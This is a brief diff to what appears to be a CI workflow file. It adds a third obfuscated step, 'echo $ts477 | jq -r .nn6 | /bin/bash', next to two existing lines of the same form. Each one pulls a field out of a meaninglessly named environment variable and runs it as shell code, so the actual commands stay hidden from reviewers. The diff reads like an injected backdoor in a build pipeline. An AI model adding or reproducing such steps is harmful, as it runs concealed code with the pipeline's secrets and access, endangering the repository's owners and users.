@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
           echo $kfs0 | jq -r .qwgqz58 | /bin/bash
+          echo $ts477 | jq -r .nn6 | /bin/bash
 
       - name: Persist output
         if: always()
